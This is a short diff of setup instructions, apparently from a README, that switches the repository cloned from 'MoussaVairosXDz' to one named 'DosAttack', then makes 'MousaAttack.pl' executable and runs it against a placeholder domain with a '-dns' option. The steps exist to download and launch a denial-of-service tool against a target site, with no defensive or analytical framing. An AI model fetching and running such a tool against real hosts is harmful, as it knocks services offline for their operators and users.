@@ -18,16 +18,16 @@ apt-get install python2
 apt-get install git 
 
 
-git clone https://github.com/MoussaUfonet/MoussaVairosXDz.git
+git clone https://github.com/MoussaUnix/DosAttack.git
 
 
-cd MoussaVairosXDz
+cd DosAttack
 
 
-perl DosAttack.pl
+chmod +x MousaAttack.pl
 
 
-perl DosAttack.pl -dns [www.example.com] -options
+perl MousaAttack.pl -dns [www.example.com] -options
 
 
 تمام شباب 
